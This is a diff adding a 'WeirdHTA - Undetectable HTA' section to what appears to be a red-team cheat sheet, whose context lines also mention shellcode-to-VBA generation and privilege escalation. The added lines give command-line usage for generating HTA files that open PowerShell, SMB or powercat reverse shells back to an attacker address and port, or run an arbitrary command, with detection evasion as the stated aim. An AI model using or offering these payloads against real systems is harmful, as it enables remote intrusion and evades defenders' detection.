@@ -952,6 +952,20 @@ python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -d yourdomain, m
 
 
 
+#### [](#header-4) WeirdHTA - Undetectable HTA
+
+```powershell
+#https://github.com/felamos/weirdhta
+
+python3 --help
+python3 weirdhta.py 10.10.10.10 4444 --normal (for normal powershell reverse_shell)
+python3 weirdhta.py 10.10.10.10 4444 --smb (without powershell payload, it will use smb)
+python3 weirdhta.py 10.10.10.10 4444 --powercat (for powercat)
+python3 weirdhta.py 10.10.10.10 4444 --command 'c:\windows\system32\cmd.exe' (custom command)
+
+```
+
+
 ## [](#header-2)Privilege Escalation
 
 Reference: https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
